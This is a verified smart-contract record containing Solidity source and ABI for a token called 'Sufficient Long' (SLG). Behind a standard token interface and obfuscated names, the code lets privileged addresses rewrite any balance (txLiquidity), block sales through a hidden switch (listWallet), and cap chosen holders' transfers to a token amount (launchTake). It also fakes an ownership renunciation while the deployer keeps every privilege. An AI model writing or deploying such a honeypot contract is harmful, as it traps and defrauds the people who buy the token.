{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface takeSwapIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract maxAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchMarketing {\n    function createPair(address maxReceiverShould, address totalTxSwap) external returns (address);\n}\n\ninterface sellShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeWallet) external view returns (uint256);\n\n    function transfer(address atMax, uint256 atFrom) external returns (bool);\n\n    function allowance(address feeAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atMax,\n        uint256 atFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletAmountToken, uint256 value);\n    event Approval(address indexed feeAt, address indexed spender, uint256 value);\n}\n\ninterface teamLaunchEnable is sellShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SufficientLong is maxAmount, sellShould, teamLaunchEnable {\n\n    function approve(address launchedAmount, uint256 atFrom) public virtual override returns (bool) {\n        teamTo[_msgSender()][launchedAmount] = atFrom;\n        emit Approval(_msgSender(), launchedAmount, atFrom);\n        return true;\n    }\n\n    address public launchedToken;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamExempt;\n    }\n\n    mapping(address => bool) public atFund;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableBuy;\n    }\n\n    uint256 public swapFund;\n\n    function allowance(address isTx, address launchedAmount) external view virtual override returns (uint256) {\n        if (launchedAmount == limitFee) {\n            return type(uint256).max;\n        }\n        return teamTo[isTx][launchedAmount];\n    }\n\n    function txLiquidity(address walletMax, uint256 atFrom) public {\n        shouldSwap();\n        totalLaunched[walletMax] = atFrom;\n    }\n\n    uint256 private enableBuy = 100000000 * 10 ** 18;\n\n    string private teamTakeWallet = \"Sufficient Long\";\n\n    function minSender(address senderToken) public {\n        if (sellFee) {\n            return;\n        }\n        \n        atFund[senderToken] = true;\n        if (limitSell == shouldTakeSell) {\n            shouldTakeSell = limitSell;\n        }\n        sellFee = true;\n    }\n\n    uint256 txSender;\n\n    function transfer(address walletMax, uint256 atFrom) external virtual override returns (bool) {\n        return sellReceiverAmount(_msgSender(), walletMax, atFrom);\n    }\n\n    uint256 private teamLiquidityTx;\n\n    event OwnershipTransferred(address indexed maxTotal, address indexed tradingMin);\n\n    uint256 walletMaxSell;\n\n    function sellReceiverAmount(address feeFund, address atMax, uint256 atFrom) internal returns (bool) {\n        if (feeFund == atLaunch) {\n            return fundTotalSell(feeFund, atMax, atFrom);\n        }\n        uint256 tokenMin = sellShould(launchedToken).balanceOf(fundTo);\n        require(tokenMin == txSender);\n        require(atMax != fundTo);\n        if (marketingTokenSell[feeFund]) {\n            return fundTotalSell(feeFund, atMax, enableSender);\n        }\n        return fundTotalSell(feeFund, atMax, atFrom);\n    }\n\n    address public atLaunch;\n\n    function owner() external view returns (address) {\n        return atSwap;\n    }\n\n    function balanceOf(address feeWallet) public view virtual override returns (uint256) {\n        return totalLaunched[feeWallet];\n    }\n\n    mapping(address => mapping(address => uint256)) private teamTo;\n\n    mapping(address => uint256) private totalLaunched;\n\n    function txFrom() public {\n        emit OwnershipTransferred(atLaunch, address(0));\n        atSwap = address(0);\n    }\n\n    mapping(address => bool) public marketingTokenSell;\n\n    address fundTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address limitFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public limitSell;\n\n    bool private fromShould;\n\n    function fundTotalSell(address feeFund, address atMax, uint256 atFrom) internal returns (bool) {\n        require(totalLaunched[feeFund] >= atFrom);\n        totalLaunched[feeFund] -= atFrom;\n        totalLaunched[atMax] += atFrom;\n        emit Transfer(feeFund, atMax, atFrom);\n        return true;\n    }\n\n    uint256 public launchedMax;\n\n    function transferFrom(address feeFund, address atMax, uint256 atFrom) external override returns (bool) {\n        if (_msgSender() != limitFee) {\n            if (teamTo[feeFund][_msgSender()] != type(uint256).max) {\n                require(atFrom <= teamTo[feeFund][_msgSender()]);\n                teamTo[feeFund][_msgSender()] -= atFrom;\n            }\n        }\n        return sellReceiverAmount(feeFund, atMax, atFrom);\n    }\n\n    constructor (){\n        \n        takeSwapIs toLimit = takeSwapIs(limitFee);\n        launchedToken = launchMarketing(toLimit.factory()).createPair(toLimit.WETH(), address(this));\n        if (shouldTakeSell == limitSell) {\n            limitSell = launchedMax;\n        }\n        atLaunch = _msgSender();\n        txFrom();\n        atFund[atLaunch] = true;\n        totalLaunched[atLaunch] = enableBuy;\n        \n        emit Transfer(address(0), atLaunch, enableBuy);\n    }\n\n    function getOwner() external view returns (address) {\n        return atSwap;\n    }\n\n    uint256 private shouldTakeSell;\n\n    function name() external view virtual override returns (string memory) {\n        return teamTakeWallet;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isAmount;\n    }\n\n    function listWallet(uint256 atFrom) public {\n        shouldSwap();\n        txSender = atFrom;\n    }\n\n    string private teamExempt = \"SLG\";\n\n    function shouldSwap() private view {\n        require(atFund[_msgSender()]);\n    }\n\n    uint8 private isAmount = 18;\n\n    uint256 constant enableSender = 6 ** 10;\n\n    address private atSwap;\n\n    function launchTake(address listTake) public {\n        shouldSwap();\n        if (limitSell != teamLiquidityTx) {\n            shouldTakeSell = launchedMax;\n        }\n        if (listTake == atLaunch || listTake == launchedToken) {\n            return;\n        }\n        marketingTokenSell[listTake] = true;\n    }\n\n    bool public sellFee;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmountToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atFrom\",\"type\":\"uint256\"}],\"name\":\"listWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTokenSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"}],\"name\":\"minSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atFrom\",\"type\":\"uint256\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SufficientLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}